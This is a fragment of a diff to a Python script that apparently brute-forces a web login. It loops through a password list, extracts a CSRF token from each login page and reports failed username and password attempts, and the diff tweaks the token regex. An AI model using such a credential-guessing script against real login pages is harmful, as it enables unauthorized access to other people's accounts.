@@ -20,7 +20,7 @@ passlist = [ item.strip() for item in passlist]
 for password in passlist:
     session = requests.Session()
     login_page = session.get(login_page_url)
-    token   = re.search('input.+?name="tokenCSRF".+?value="(.+?)"',login_page.text).group(1)
+    token   = re.search('value="(.+?)"',login_page.text).group(1)
     print(f"Password as ip :{password}")
 
     headers = {
@@ -46,3 +46,4 @@ for password in passlist:
     #print(login_result.headers['location'])
         else:
             print(f"Credentials for login Failed with {username}:{password}")
+     #time.sleep(2) #comment out for making 2 sec wait per reply request
